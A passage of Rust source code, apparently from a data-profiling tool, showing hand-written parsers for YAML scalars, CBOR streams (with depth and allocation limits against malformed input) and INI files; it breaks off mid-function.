            return parse_double_quoted(s, &mut cursor);
        }
        if s.starts_with('\'') {
            let mut cursor = 0usize;
            return parse_single_quoted(s, &mut cursor);
        }
        Ok(s.to_string())
    }

    /// Resolves a single-line scalar (quoted or plain) to its
    /// `JsonValue`. A quoted scalar is always a `String`, regardless of
    /// what it looks like - the same "declared/explicit type wins"
    /// principle this project already applies everywhere else, here
    /// expressed by YAML's own quoting syntax rather than a schema.
    fn resolve_scalar_value(raw: &str) -> Result<JsonValue> {
        let trimmed = raw.trim();
        // A no-op for block context (already stripped before this is
        // reached, for column-tracking reasons - see
        // `strip_anchor_prefix`'s own doc comment); needed here for flow
        // context (`{a: &x 1}`), which has no equivalent earlier step.
        let (trimmed, _) = strip_anchor_prefix(trimmed);
        if trimmed.starts_with('"') {
            let mut cursor = 0usize;
            return Ok(JsonValue::String(parse_double_quoted(
                trimmed,
                &mut cursor,
            )?));
        }
        if trimmed.starts_with('\'') {
            let mut cursor = 0usize;
            return Ok(JsonValue::String(parse_single_quoted(
                trimmed,
                &mut cursor,
            )?));
        }
        if let Some(rest) = trimmed.strip_prefix("!!str ") {
            return Ok(JsonValue::String(unquote_if_quoted(rest.trim())?));
        }
        if let Some(rest) = trimmed.strip_prefix("!!int ") {
            let text = unquote_if_quoted(rest.trim())?;
            return parse_plain_int(&text)
                .ok_or_else(|| anyhow!("invalid !!int YAML scalar: {rest:?}"));
        }
        if let Some(rest) = trimmed.strip_prefix("!!float ") {
            let text = unquote_if_quoted(rest.trim())?;
            return text
                .parse::<f64>()
                .ok()
                .and_then(serde_json::Number::from_f64)
                .map(JsonValue::Number)
                .ok_or_else(|| anyhow!("invalid !!float YAML scalar: {rest:?}"));
        }
        if let Some(rest) = trimmed.strip_prefix("!!bool ") {
            let text = unquote_if_quoted(rest.trim())?;
            return parse_plain_bool(&text)
                .map(JsonValue::Bool)
                .ok_or_else(|| anyhow!("invalid !!bool YAML scalar: {rest:?}"));
        }
        if let Some(rest) = trimmed.strip_prefix('!') {
            // Any other tag (custom, or a core tag like !!null already
            // implied by a bare/empty value) - strip the tag token and
            // resolve whatever follows normally, rather than guessing at
            // tag semantics this project doesn't otherwise need.
            return match rest.find(' ') {
                Some(sp) => resolve_plain_scalar(rest[sp + 1..].trim()),
                None => Ok(JsonValue::Null),
            };
        }
        resolve_plain_scalar(trimmed)
    }

    fn resolve_plain_scalar(s: &str) -> Result<JsonValue> {
        if s.is_empty() || s == "~" || s.eq_ignore_ascii_case("null") {
            return Ok(JsonValue::Null);
        }
        // An anchor's own *value* is read normally (see
        // `strip_anchor_prefix`), but dereferencing it elsewhere via an
        // alias is genuinely out of scope - a clear, disclosed error
        // here rather than silently misreading the reference as a
        // literal `"*name"` string, this project's usual "no silent
        // misreading" rule applied to a real YAML feature gap instead of
        // a heuristic.
        if s.starts_with('*') && s.len() > 1 {
            bail!(
                "YAML aliases (*name) aren't supported - the anchored value itself \
                 (&name) is read normally, but referencing it elsewhere via '{s}' is not"
            );
        }
        if let Some(b) = parse_plain_bool(s) {
            return Ok(JsonValue::Bool(b));
        }
        if matches!(s, ".inf" | ".Inf" | ".INF" | "+.inf" | "+.Inf" | "+.INF") {
            return Ok(JsonValue::Number(
                serde_json::Number::from_f64(f64::INFINITY).unwrap(),
            ));
        }
        if matches!(s, "-.inf" | "-.Inf" | "-.INF") {
            return Ok(JsonValue::Number(
                serde_json::Number::from_f64(f64::NEG_INFINITY).unwrap(),
            ));
        }
        if matches!(s, ".nan" | ".NaN" | ".NAN") {
            // serde_json::Number can't represent NaN at all - left as the
            // literal string, the same "can't losslessly represent this"
            // treatment this project already gives a handful of other
            // edge values (compare Avro's Duration logical type).
            return Ok(JsonValue::String(s.to_string()));
        }
        if let Some(n) = parse_plain_int(s) {
            return Ok(n);
        }
        if let Ok(f) = s.parse::<f64>()
            && let Some(num) = serde_json::Number::from_f64(f)
        {
            return Ok(JsonValue::Number(num));
        }
        Ok(JsonValue::String(s.to_string()))
    }

    fn parse_plain_bool(s: &str) -> Option<bool> {
        match s {
            "true" | "True" | "TRUE" => Some(true),
            "false" | "False" | "FALSE" => Some(false),
            _ => None,
        }
    }

    fn parse_plain_int(s: &str) -> Option<JsonValue> {
        let (sign, digits) = match s.strip_prefix('-') {
            Some(d) => (-1i64, d),
            None => (1i64, s.strip_prefix('+').unwrap_or(s)),
        };
        if digits.is_empty() {
            return None;
        }
        if let Some(hex) = digits.strip_prefix("0x") {
            return i64::from_str_radix(hex, 16)
                .ok()
                .map(|v| JsonValue::from(sign * v));
        }
        if let Some(oct) = digits.strip_prefix("0o") {
            return i64::from_str_radix(oct, 8)
                .ok()
                .map(|v| JsonValue::from(sign * v));
        }
        if !digits.bytes().all(|b| b.is_ascii_digit()) {
            return None;
        }
        digits
            .parse::<i64>()
            .ok()
            .map(|v| JsonValue::from(sign * v))
            .or_else(|| digits.parse::<u64>().ok().map(JsonValue::from))
    }
}

#[cfg(feature = "yaml")]
fn columns_from_yaml(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    let content = fs::read_to_string(path).with_context(|| format!("failed to read {path:?}"))?;

    let mut documents = yaml_support::parse_yaml_documents(&content)
        .with_context(|| format!("failed to parse YAML in {path:?}"))?;
    documents.retain(|v| !v.is_null());

    // Same dual-mode dispatch as before: a single top-level sequence is
    // an array of records (JSON's `[...]` mode); anything else - one
    // mapping, one bare scalar, or a `---`-separated multi-document
    // stream - is one record per document/element (TOML's own "whole
    // document = one row" choice for its single-document shape).
    let mut values: Vec<JsonValue> = Vec::new();
    match documents.len() {
        1 => match documents.into_iter().next().unwrap() {
            JsonValue::Array(items) => values.extend(items),
            other => values.push(other),
        },
        _ => values.extend(documents),
    }

    if let Some(n) = nrows {
        values.truncate(n);
    }

    // Not every document/element is a mapping - a real, valid shape
    // (a top-level sequence of scalars, a bare scalar document, or a
    // multi-doc stream mixing shapes - all found via a real-world sweep
    // against yaml-test-suite, the spec compliance corpus), not something
    // to reject. Same fallback the JSON reader already uses for its own
    // analogous case: profile the whole set as a single "value" column
    // through the same recursive engine a nested array-of-scalars
    // sub-column goes through, rather than a "must be a mapping" error.
    if values.iter().all(JsonValue::is_object) {
        let records: Vec<serde_json::Map<String, JsonValue>> = values
            .into_iter()
            .map(|v| match v {
                JsonValue::Object(m) => m,
                _ => unreachable!("just checked every value is an object"),
            })
            .collect();
        Ok(profile_json_records(&records, n_samples))
    } else {
        let total = values.len();
        let refs: Vec<&JsonValue> = values.iter().filter(|v| !v.is_null()).collect();
        Ok(profile_json_path(
            "value".to_string(),
            total,
            refs,
            n_samples,
        ))
    }
}

#[cfg(not(feature = "yaml"))]
fn columns_from_yaml(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "YAML support isn't compiled in - rebuild with `cargo build --release --features yaml` (or --features full)"
    )
}

// --- CBOR reader (opt-in via --features cbor) ---
// Same shape as the MessagePack reader above: CBOR values are
// self-delimiting, so a data file is read as a stream of concatenated
// top-level values (or, if there's exactly one top-level value and it's an
// array, that array's elements instead - mirroring the JSON reader's
// `[...]` mode). The decoder itself (`cbor_support`) is hand-rolled - see
// CLAUDE.md's Dependency footprint section for why and how it was verified.
// It's a genuinely separate implementation from `msgpack_support` (its own
// byte-reading helpers, its own `Value` type) rather than shared code -
// the two wire formats only look similar at a glance; CBOR's major-
// type/additional-info framing, indefinite-length chunking, and negative-
// integer encoding are all structurally different from MessagePack's fixed
// per-marker byte layout.

#[cfg(feature = "cbor")]
mod cbor_support {
    use super::*;
    use std::io::Read;

    /// Matches `ciborium`'s own *default* recursion limit exactly (see
    /// `ciborium::de::from_reader_with_recursion_limit`'s doc comment:
    /// "Set a high recursion limit at your own risk (of stack
    /// exhaustion)!") - not a coincidence, but independent corroboration
    /// of the same real, empirically-confirmed risk `msgpack_support`
    /// already found and fixed for the identical underlying reason: a
    /// CBOR-decoded `serde_json::Value` tree bypasses `serde_json`'s own
    /// parse-time recursion guard entirely (that guard only fires while
    /// parsing *text*), so this reader's own recursive decode/convert path
    /// is the only thing standing between adversarially deep input and a
    /// debug-build stack overflow (debug's much larger, uninlined stack
    /// frames are what made `msgpack_support`'s 1024-level default unsafe
    /// in the 700-900 level range, well under 1024 - see its own comment).
    const MAX_DEPTH: u32 = 256;

    /// Same pre-allocation-DoS guard as `msgpack_support::PREALLOC_MAX`,
    /// for the same reason: CBOR's `bytes`/`text` length field can be a
    /// full `u64` (major type 2/3, additional info 27), so a handful of
    /// header bytes can otherwise claim an enormous length before a single
    /// byte of real content has been read. `read_n_bytes` still lets an
    /// actual read grow past this via `Read::take(len).read_to_end`, which
    /// only ever allocates as far as real bytes are actually available.
    const PREALLOC_MAX: usize = 64 * 1024;

    #[derive(Debug, Clone)]
    pub(crate) enum Value {
        Null,
        Bool(bool),
        /// `i128`, not `i64` - CBOR's own integer range is asymmetric and
        /// wider than `i64` on both ends (an unsigned major-type-0 value up
        /// to `u64::MAX`, and a negative major-type-1 value down to
        /// `-1 - u64::MAX`), confirmed directly against
        /// `ciborium::value::Integer`'s own internal `i128` representation
        /// rather than assumed - see CLAUDE.md's dependency-footprint entry
        /// for the exact verification (`neg!(-18446744073709551616)`
        /// round-tripping through raw bytes `3bffffffffffffffff`).
        Integer(i128),
        Float(f64),
        Text(String),
        Bytes(Vec<u8>),
        Array(Vec<Value>),
        Map(Vec<(Value, Value)>),
        /// A tagged value (major type 6: a tag number plus one embedded
        /// item). Verified directly against `ciborium::value::de`'s own
        /// `Value`-deserialization path (not its *further* deserialization
        /// into some other target type, where a handful of specific tags
        /// like bignum get special-cased) that decoding straight into
        /// `Value` keeps every tag uniform regardless of its number - so
        /// this reader does too, rather than special-casing a handful of
        /// well-known tags no differently than `ciborium` itself would.
        Tag(u64, Box<Value>),
    }

    fn read_bytes<const N: usize, R: Read>(r: &mut R) -> Result<[u8; N]> {
        let mut buf = [0u8; N];
        r.read_exact(&mut buf)
            .with_context(|| format!("truncated CBOR stream: expected {N} more byte(s)"))?;
        Ok(buf)
    }

    fn read_u8<R: Read>(r: &mut R) -> Result<u8> {
        Ok(read_bytes::<1, _>(r)?[0])
    }
    fn read_u16<R: Read>(r: &mut R) -> Result<u16> {
        Ok(u16::from_be_bytes(read_bytes(r)?))
    }
    fn read_u32<R: Read>(r: &mut R) -> Result<u32> {
        Ok(u32::from_be_bytes(read_bytes(r)?))
    }
    fn read_u64<R: Read>(r: &mut R) -> Result<u64> {
        Ok(u64::from_be_bytes(read_bytes(r)?))
    }
    fn read_f32<R: Read>(r: &mut R) -> Result<f32> {
        Ok(f32::from_be_bytes(read_bytes(r)?))
    }
    fn read_f64<R: Read>(r: &mut R) -> Result<f64> {
        Ok(f64::from_be_bytes(read_bytes(r)?))
    }

    /// Converts a raw IEEE-754 half-precision (binary16) bit pattern to
    /// `f64` via plain floating-point arithmetic rather than bit-twiddling
    /// (simpler to verify by hand, and this project has no other use for
    /// a general-purpose f16 type). Deliberately not the `half` crate,
    /// which isn't already a dependency anywhere in this project and would
    /// be a new one purely for this one conversion - contrary to the whole
    /// point of this hand-roll. Hand-verified against eight known reference
    /// bit patterns before being trusted: `0x3C00`=1.0, `0x4000`=2.0,
    /// `0xC000`=-2.0, `0x7C00`=+inf, `0xFC00`=-inf, `0x7E00`=NaN,
    /// `0x0001`=smallest subnormal (2^-24), `0x0400`=smallest normal
    /// (2^-14) - every one matched by hand-computation before this formula
    /// was relied on.
    fn f16_to_f64(bits: u16) -> f64 {
        let sign = if bits & 0x8000 != 0 { -1.0 } else { 1.0 };
        let exp = (bits >> 10) & 0x1F;
        let frac = f64::from(bits & 0x3FF);
        match exp {
            0 => sign * frac * 2f64.powi(-24),
            0x1F if frac == 0.0 => sign * f64::INFINITY,
            0x1F => f64::NAN,
            _ => sign * (1.0 + frac / 1024.0) * 2f64.powi(i32::from(exp) - 15),
        }
    }

    fn read_n_bytes<R: Read>(r: &mut R, len: usize) -> Result<Vec<u8>> {
        let mut buf = Vec::with_capacity(len.min(PREALLOC_MAX));
        let n = r
            .take(len as u64)
            .read_to_end(&mut buf)
            .context("failed reading CBOR bytes/text data")?;
        if n != len {
            bail!("truncated CBOR stream: expected {len} byte(s), got {n}");
        }
        Ok(buf)
    }

    /// Reads a major-type/additional-info argument (RFC 8949 §3): additional
    /// info 0-23 is the value itself, 24/25/26/27 mean "1/2/4/8 more bytes
    /// follow" (big-endian), 28-30 are reserved, and 31 means indefinite
    /// length - returned as `None` since it carries no length at all.
    /// Verified directly against `ciborium-ll`'s own `pull_title` (`dec.rs`)
    /// rather than assumed from RFC prose alone.
    fn read_argument<R: Read>(r: &mut R, info: u8) -> Result<Option<u64>> {
        match info {
            0..=23 => Ok(Some(u64::from(info))),
            24 => Ok(Some(u64::from(read_u8(r)?))),
            25 => Ok(Some(u64::from(read_u16(r)?))),
            26 => Ok(Some(u64::from(read_u32(r)?))),
            27 => Ok(Some(read_u64(r)?)),
            28..=30 => bail!("malformed CBOR stream: reserved additional-info value {info}"),
            31 => Ok(None),
            _ => unreachable!("5-bit additional info"),
        }
    }

    /// Same as `read_argument`, but for a context where an indefinite
    /// length is never legal (an unsigned/negative integer, a tag number,
    /// or one chunk of a chunked bytes/text string - RFC 8949 forbids
    /// nesting indefinite-length inside indefinite-length).
    fn read_definite_argument<R: Read>(r: &mut R, info: u8, context: &str) -> Result<u64> {
        read_argument(r, info)?.with_context(|| {
            format!("malformed CBOR stream: indefinite length is not valid for {context}")
        })
    }

    /// Reads one CBOR-encoded value (RFC 8949). `depth` is a remaining-
    /// recursion budget, not a running total - same contract as
    /// `msgpack_support::read_value`.
    fn read_value<R: Read>(r: &mut R, depth: u32) -> Result<Value> {
        let initial = read_u8(r)?;
        read_value_from(r, initial, depth)
    }

    /// Same as `read_value`, but for a caller that has already consumed the
    /// initial marker byte (needed because a generic `Read` has no
    /// peek/pushback: indefinite-length array/map/bytes/text decoding has
    /// to read the next byte to check for the `0xFF` break marker, and if
    /// it isn't one, feed that already-consumed byte back in here rather
    /// than reading a fresh one).
    fn read_value_from<R: Read>(r: &mut R, initial: u8, depth: u32) -> Result<Value> {
        if depth == 0 {
            bail!("malformed CBOR stream: nested more than {MAX_DEPTH} levels deep");
        }
        let major = initial >> 5;
        let info = initial & 0x1F;
        match major {
            0 => Ok(Value::Integer(
                read_definite_argument(r, info, "an unsigned integer")? as i128,
            )),
            1 => Ok(Value::Integer(
                -1 - read_definite_argument(r, info, "a negative integer")? as i128,
            )),
            2 => Ok(Value::Bytes(read_bytes_body(r, info)?)),
            3 => Ok(Value::Text(read_text_body(r, info)?)),
            4 => Ok(Value::Array(read_array_body(r, info, depth - 1)?)),
            5 => Ok(Value::Map(read_map_body(r, info, depth - 1)?)),
            6 => {
                let tag = read_definite_argument(r, info, "a tag")?;
                let inner = read_value(r, depth - 1)?;
                Ok(Value::Tag(tag, Box::new(inner)))
            }
            7 => read_simple_or_float(r, info),
            _ => unreachable!("3-bit major type"),
        }
    }

    /// Major type 7: booleans, null/undefined, simple values, and floats.
    /// `undefined` (additional info 23) collapses to `Value::Null`, the
    /// same as CBOR's own `null` (info 22) - verified directly against
    /// `ciborium`'s own deserialization dispatch (`de/mod.rs`), which
    /// routes both through `deserialize_option`/`visit_none` and has no
    /// separate `Value` variant for `undefined` at all. Any other simple
    /// value (an unassigned info 0-19, or an out-of-range byte following
    /// info 24) is a hard decode error rather than a guess, matching
    /// `ciborium`'s own `Err(h.expected("known simple value"))` for the
    /// identical case.
    fn read_simple_or_float<R: Read>(r: &mut R, info: u8) -> Result<Value> {
        match info {
            0..=19 => bail!("malformed CBOR stream: unsupported simple value {info}"),
            20 => Ok(Value::Bool(false)),
            21 => Ok(Value::Bool(true)),
            22 | 23 => Ok(Value::Null),
            24 => match read_u8(r)? {
                20 => Ok(Value::Bool(false)),
                21 => Ok(Value::Bool(true)),
                22 | 23 => Ok(Value::Null),
                n => bail!("malformed CBOR stream: unsupported simple value {n}"),
            },
            25 => Ok(Value::Float(f16_to_f64(read_u16(r)?))),
            26 => Ok(Value::Float(f64::from(read_f32(r)?))),
            27 => Ok(Value::Float(read_f64(r)?)),
            28..=30 => bail!("malformed CBOR stream: reserved additional-info value {info}"),
            31 => {
                bail!(
                    "malformed CBOR stream: unexpected break code outside an indefinite-length item"
                )
            }
            _ => unreachable!("5-bit additional info"),
        }
    }

    /// Definite length reads exactly `len` bytes; indefinite length (RFC
    /// 8949 §3.2.3) is a sequence of definite-length chunks of the *same*
    /// major type (2, here), terminated by the break byte `0xFF` - verified
    /// directly against `ciborium`'s own `deserialize_byte_buf` rather than
    /// assumed. A chunk of the wrong major type is a hard error, matching
    /// the spec's own prohibition.
    fn read_bytes_body<R: Read>(r: &mut R, info: u8) -> Result<Vec<u8>> {
        match read_argument(r, info)? {
            Some(len) => read_n_bytes(r, len as usize),
            None => {
                let mut out = Vec::new();
                loop {
                    let b = read_u8(r)?;
                    if b == 0xFF {
                        break;
                    }
                    if b >> 5 != 2 {
                        bail!(
                            "malformed CBOR stream: indefinite-length byte string contains a non-bytes chunk"
                        );
                    }
                    let len = read_definite_argument(r, b & 0x1F, "a byte-string chunk")?;
                    out.extend(read_n_bytes(r, len as usize)?);
                }
                Ok(out)
            }
        }
    }

    /// Same chunking convention as `read_bytes_body`, but for major type 3
    /// (text). UTF-8 is validated once over the fully-assembled bytes -
    /// deliberately a hard error on invalid UTF-8 (unlike MessagePack's
    /// looser hex-dump fallback), matching both RFC 8949's own requirement
    /// that a `text` item's content always be UTF-8 and `ciborium`'s own
    /// verified behavior (its `deserialize_str`/`deserialize_string`
    /// explicitly call `core::str::from_utf8` and propagate the error).
    fn read_text_body<R: Read>(r: &mut R, info: u8) -> Result<String> {
        let bytes = match read_argument(r, info)? {
            Some(len) => read_n_bytes(r, len as usize)?,
            None => {
                let mut out = Vec::new();
                loop {
                    let b = read_u8(r)?;
                    if b == 0xFF {
                        break;
                    }
                    if b >> 5 != 3 {
                        bail!(
                            "malformed CBOR stream: indefinite-length text string contains a non-text chunk"
                        );
                    }
                    let len = read_definite_argument(r, b & 0x1F, "a text-string chunk")?;
                    out.extend(read_n_bytes(r, len as usize)?);
                }
                out
            }
        };
        String::from_utf8(bytes)
            .map_err(|e| anyhow!("malformed CBOR stream: text string is not valid UTF-8: {e}"))
    }

    /// Definite length reads exactly `len` elements; indefinite length reads
    /// values until the break byte. Deliberately builds the `Vec`
    /// incrementally (`Vec::new()` + `.push()`) rather than
    /// `(0..len).map(...).collect()`, the same pre-allocation-DoS fix
    /// `msgpack_support::read_array` already needed for the identical
    /// reason: `len` is read directly from the untrusted stream and can be
    /// a full `u64` for a definite-length array.
    fn read_array_body<R: Read>(r: &mut R, info: u8, depth: u32) -> Result<Vec<Value>> {
        match read_argument(r, info)? {
            Some(len) => {
                let mut out = Vec::new();
                for _ in 0..len {
                    out.push(read_value(r, depth)?);
                }
                Ok(out)
            }
            None => {
                let mut out = Vec::new();
                loop {
                    let b = read_u8(r)?;
                    if b == 0xFF {
                        break;
                    }
                    out.push(read_value_from(r, b, depth)?);
                }
                Ok(out)
            }
        }
    }

    /// Same shape as `read_array_body`, alternating key/value reads.
    fn read_map_body<R: Read>(r: &mut R, info: u8, depth: u32) -> Result<Vec<(Value, Value)>> {
        match read_argument(r, info)? {
            Some(len) => {
                let mut out = Vec::new();
                for _ in 0..len {
                    let k = read_value(r, depth)?;
                    let v = read_value(r, depth)?;
                    out.push((k, v));
                }
                Ok(out)
            }
            None => {
                let mut out = Vec::new();
                loop {
                    let b = read_u8(r)?;
                    if b == 0xFF {
                        break;
                    }
                    let k = read_value_from(r, b, depth)?;
                    let v = read_value(r, depth)?;
                    out.push((k, v));
                }
                Ok(out)
            }
        }
    }

    fn key_to_string(k: &Value) -> String {
        if let Value::Text(s) = k {
            return s.clone();
        }
        value_to_json(k).to_string()
    }

    fn value_to_json(v: &Value) -> JsonValue {
        match v {
            Value::Null => JsonValue::Null,
            Value::Bool(b) => JsonValue::Bool(*b),
            Value::Integer(i) => i64::try_from(*i)
                .map(JsonValue::from)
                .unwrap_or_else(|_| JsonValue::String(i.to_string())),
            Value::Float(f) => {
                serde_json::Number::from_f64(*f).map_or(JsonValue::Null, JsonValue::Number)
            }
            Value::Text(s) => JsonValue::String(s.clone()),
            Value::Bytes(b) => {
                JsonValue::String(b.iter().map(|byte| format!("{byte:02x}")).collect())
            }
            Value::Array(items) => JsonValue::Array(items.iter().map(value_to_json).collect()),
            Value::Map(pairs) => JsonValue::Object(
                pairs
                    .iter()
                    .map(|(k, v)| (key_to_string(k), value_to_json(v)))
                    .collect(),
            ),
            // A tagged value (CBOR's major type 6, e.g. a date-time or
            // bignum hint) - best-effort: keep the tag number visible
            // rather than silently dropping it, same choice as YAML's
            // `!Tag` handling.
            Value::Tag(tag, inner) => {
                let mut obj = serde_json::Map::new();
                obj.insert(format!("tag({tag})"), value_to_json(inner));
                JsonValue::Object(obj)
            }
        }
    }

    /// Reads a stream of top-level CBOR values (each value is self-
    /// delimiting, so records can just be concatenated back-to-back in the
    /// file). If the file holds exactly one top-level value and it's an
    /// array, that array's elements are treated as the records instead,
    /// mirroring how the JSON/MessagePack readers treat a single top-level
    /// `[...]` array.
    pub(crate) fn columns_from_cbor(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        use std::fs::File;
        use std::io::BufRead;
        use std::io::BufReader;

        let file = File::open(path).with_context(|| format!("failed to open {path:?}"))?;
        let mut reader = BufReader::new(file);

        let mut top_values = Vec::new();
        while !reader
            .fill_buf()
            .with_context(|| format!("failed reading {path:?}"))?
            .is_empty()
        {
            let v = read_value(&mut reader, MAX_DEPTH)
                .with_context(|| format!("failed decoding a CBOR value from {path:?}"))?;
            top_values.push(v);
        }

        let values: Vec<Value> = if top_values.len() == 1 {
            match top_values.into_iter().next().unwrap() {
                Value::Array(items) => items,
                other => vec![other],
            }
        } else {
            top_values
        };

        let mut values: Vec<JsonValue> = values.iter().map(value_to_json).collect();
        if let Some(n) = nrows {
            values.truncate(n);
        }

        // Same fallback as MessagePack's reader (and JSON/YAML/Avro before
        // it): a stream of bare CBOR scalars (e.g. IoT/telemetry readings -
        // CBOR is the format RFC 7049/8949 was written for, and
        // constrained-device telemetry is exactly this shape in practice)
        // has no field names to extract, but is still a genuine single
        // column, not an error.
        if values.iter().all(JsonValue::is_object) {
            let records: Vec<serde_json::Map<String, JsonValue>> = values
                .into_iter()
                .map(|v| match v {
                    JsonValue::Object(m) => m,
                    _ => unreachable!("just checked every value is an object"),
                })
                .collect();
            Ok(profile_json_records(&records, n_samples))
        } else {
            let total = values.len();
            let refs: Vec<&JsonValue> = values.iter().filter(|v| !v.is_null()).collect();
            Ok(profile_json_path(
                "value".to_string(),
                total,
                refs,
                n_samples,
            ))
        }
    }
} // mod cbor_support

#[cfg(feature = "cbor")]
fn columns_from_cbor(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    cbor_support::columns_from_cbor(path, nrows, n_samples)
}

#[cfg(not(feature = "cbor"))]
fn columns_from_cbor(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "CBOR support isn't compiled in - rebuild with `cargo build --release --features cbor` (or --features full)"
    )
}

// --- INI reader (opt-in via --features ini, hand-rolled - see
// `ini_support` below and CLAUDE.md's Dependency footprint section) ---
// An INI file's sections are already "multiple named groups of key=value
// pairs", so - like SQLite's tables and Excel's sheets - this returns one
// profile list per section rather than assuming a single implicit table.
// Within a section there's no repeating "row" concept (it's a flat set of
// keys), so each section is profiled as a single record, the same choice
// TOML/YAML make for their own single-document shapes. A key repeated
// within one section (INI permits this) pools into one array value rather
// than the second occurrence silently overwriting the first.

/// A from-scratch INI parser, replacing `rust-ini` (kept as a dev-only
/// cross-verification oracle - see Cargo.toml and CLAUDE.md's Dependency
/// footprint section). Line-oriented rather than rust-ini's own
/// character-stream state machine: a line is a comment (`;`/`#`, once
/// leading whitespace is trimmed - deliberately more lenient than
/// rust-ini's own stricter "must be the literal first character with no
/// leading whitespace at all, else it's a parse error" rule, since no
/// real file this project tested against ever exercised that corner and
/// treating an indented comment as a comment is the far more standard,
/// expected INI convention), a `[section]` header, a blank line, or a
/// `key=value`/`key:value` pair - matching rust-ini's own choice to
/// accept either delimiter. Re-opening a `[section]` already seen
/// earlier in the file appends into that same section rather than
/// creating a second one, matching rust-ini's own `ListOrderedMultimap`-
/// backed behavior (confirmed against its source, not assumed) - the
/// same reason this parser also uses an explicit ordered `Vec` plus a
/// name-to-index map instead of a plain `HashMap`, since section (and,
/// within a section, key) order is real, observable output shape here,
/// not an implementation detail.
///
/// Value parsing mirrors rust-ini's own quoting/escaping rules exactly,
/// checked directly against its source rather than assumed: leading
/// whitespace is skipped once, then the value is built from zero or
/// more `"..."`/`'...'` quoted segments (each with its own backslash-
/// escape grammar applied) interleaved with unquoted trailing text - a
/// real, if unusual, convention this enables (`key='Single Quote' with
/// extra value` resolves to `Single Quote with extra value`, e.g.
/// rust-ini's own doc example): the text right after a closing quote is
/// *not* re-trimmed of its own leading whitespace, only trailing, so a
/// space between a quoted segment and trailing text survives into the
/// concatenated result. The escape grammar itself
/// (`\0 \a \b \t \r \n \xHHHH`, an escaped literal newline as a line-
/// continuation that contributes nothing to the value, and any other
/// `\c` reducing to the literal character `c` - covering `\\`, `\"`,
/// `\'`, `\;`, `\#`, `\=`, `\:`, and an escaped space to preserve
/// otherwise-trimmed whitespace) is shared identically between quoted
/// and unquoted text, matching rust-ini's own single shared
/// `parse_str_until` implementation for both.
#[cfg(feature = "ini")]
mod ini_support {
    use super::*;

    /// One parsed INI document: an ordered list of sections (`None` for
    /// the general section before any `[header]`), each an ordered list
    /// of `(key, value)` pairs - order and duplicates both preserved, so
    /// the caller can decide how to pool a repeated key.
    pub(crate) type IniSections = Vec<(Option<String>, Vec<(String, String)>)>;

    fn unescape_ini_run(s: &str, terminator: Option<char>) -> Result<(String, usize)> {
        let mut out = String::new();
        let mut chars = s.char_indices().peekable();
        while let Some((i, c)) = chars.next() {
            if Some(c) == terminator {
                return Ok((out, i + c.len_utf8()));
            }
            if c != '\\' {
                out.push(c);
                continue;
            }
            match chars.next() {
                None => out.push('\\'),
                Some((_, '0')) => out.push('\0'),
                Some((_, 'a')) => out.push('\u{7}'),
                Some((_, 'b')) => out.push('\u{8}'),
                Some((_, 't')) => out.push('\t'),
                Some((_, 'r')) => out.push('\r'),
                Some((_, 'n')) => out.push('\n'),
                Some((_, '\n')) => {} // escaped newline: line continuation, nothing emitted
                Some((_, 'x')) => {
                    let hex: String = (0..4)
                        .filter_map(|_| chars.next().map(|(_, c)| c))
                        .collect();
                    if hex.chars().count() != 4 {
                        bail!("truncated \\x escape in INI value");
                    }
                    let code =
                        u32::from_str_radix(&hex, 16).context("invalid \\x escape in INI value")?;
                    match char::from_u32(code) {
                        Some(ch) => out.push(ch),
                        None => bail!("invalid unicode escape in INI value: \\x{hex}"),
                    }
                }
                Some((_, other)) => out.push(other),
            }
        }
        if terminator.is_some() {
            bail!("unterminated quoted INI value (missing closing quote)");
        }
        Ok((out, s.len()))
    }

    fn parse_ini_value(raw: &str) -> Result<String> {
        let mut val = String::new();
        let mut rest = raw.trim_start();
        let mut first_part = true;
        loop {
            if let Some(after) = rest.strip_prefix('"') {
                let (content, consumed) = unescape_ini_run(after, Some('"'))?;
                val.push_str(&content);
                rest = &after[consumed..];
                first_part = false;
                continue;
            }
            if let Some(after) = rest.strip_prefix('\'') {
                let (content, consumed) = unescape_ini_run(after, Some('\''))?;
                val.push_str(&content);
                rest = &after[consumed..];
                first_part = false;
                continue;
            }
            let (content, _) = unescape_ini_run(rest, None)?;
            let trimmed = if first_part {
                content.trim()
            } else {
                content.trim_end()
            };
            val.push_str(trimmed);
            break;
        }
        Ok(val)
    }

    fn ini_section_index(
        sections: &mut IniSections,
        index: &mut HashMap<Option<String>, usize>,
        key: Option<String>,
    ) -> usize {
        if let Some(&i) = index.get(&key) {
            return i;
        }
        sections.push((key.clone(), Vec::new()));
        let i = sections.len() - 1;
        index.insert(key, i);
        i
    }

    pub(crate) fn parse_ini(text: &str) -> Result<IniSections> {
        let mut sections: IniSections = Vec::new();
        let mut index: HashMap<Option<String>, usize> = HashMap::new();
        let mut current: Option<String> = None;

        for (line_no, raw_line) in text.lines().enumerate() {
            let line = raw_line.trim_end_matches('\r');
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with(';') || trimmed.starts_with('#') {
                continue;
            }
            if let Some(rest) = trimmed.strip_prefix('[') {
                let Some(end) = rest.find(']') else {
                    bail!(
                        "line {}: section header missing closing ']': {trimmed:?}",
                        line_no + 1
                    );
                };
                current = Some(rest[..end].trim().to_string());
                continue;
            }
            let Some(sep) = trimmed.find(['=', ':']) else {
                bail!(
                    "line {}: expected 'key=value' or 'key:value', found {trimmed:?}",
                    line_no + 1
                );
            };
            let key = trimmed[..sep].trim();
            if key.is_empty() {
                bail!("line {}: missing key before '{}'", line_no + 1, trimmed);
            }
            let value = parse_ini_value(&trimmed[sep + 1..])?;
            let idx = ini_section_index(&mut sections, &mut index, current.clone());
            sections[idx].1.push((key.to_string(), value));
        }

        Ok(sections)
    }
}

#[cfg(feature = "ini")]
fn columns_from_ini(path: &Path, n_samples: usize) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
    let content = fs::read_to_string(path).with_context(|| format!("failed to read {path:?}"))?;
    let sections = ini_support::parse_ini(&content)
        .with_context(|| format!("failed to parse {path:?} as INI"))?;

    let mut out = Vec::new();
    for (section_name, props) in sections {
